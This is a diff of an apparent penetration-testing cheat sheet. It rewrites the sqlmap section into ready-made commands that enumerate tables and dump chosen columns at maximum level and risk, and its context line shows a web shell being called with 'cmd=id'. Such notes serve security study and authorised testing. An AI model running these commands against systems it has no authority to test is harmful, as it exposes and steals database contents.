@@ -52,16 +52,21 @@ http://target.com/shell.php?cmd=id
 
 sqlmap
 
--u                 Target URL.
---random-agent     Use randomly selected HTTP User-Agent header value.
---dbms=value       Force back-end DBMS to this value (MSSQL, MySQL, Oracle).
---level=#          Level of tests to perform (1-5, default 1).
---risk=#           Risk of tests to perform (1-3, default 1).
--b                 Retrieve DBMS banner.
---passwords        Enumerate DBMS users password hashes.
---crawl=#          Crawl the website starting from the target URL.
+sqlmap.py -u 'http://www.target.com' --random-agent --dbms=DBMS --level=5 --risk=3
+sqlmap.py -u 'http://www.target.com' --random-agent --dbms=MySQL --level=5 --risk=3 -D test --tables --batch
+sqlmap.py -u 'http://www.target.com' --random-agent --dbms=MySQL --level=5 --risk=3 -D test -T <table> -C <col1,col2> --dump --batch
 
-sqlmap.py -u 'http://www.target.com' --random-agent --dbms=MSSQL --level=3 --risk=3 -b --passwords --crawl=10
+-u                 Target URL
+--random-agent     Use randomly selected HTTP User-Agent header value
+--dbms=value       Force back-end DBMS to this value (DBMS, MSSQL, MySQL, Oracle)
+--level=#          Level of tests to perform (1-5, default 1)
+--risk=#           Risk of tests to perform (1-3, default 1)
+--tables           Enumerate DBMS database tables
+--dump             Dump DBMS database table entries
+-D DB              DBMS database to enumerate
+-T TBL             DBMS database table(s) to enumerate
+-C COL             DBMS database table column(s) to enumerate
+--batch            Never ask for user input, use the default behavior
 ------------------------------------------------------------------------------------------------------
 
 # Use Burp to trap a request. Copy the request to /root/tmp.
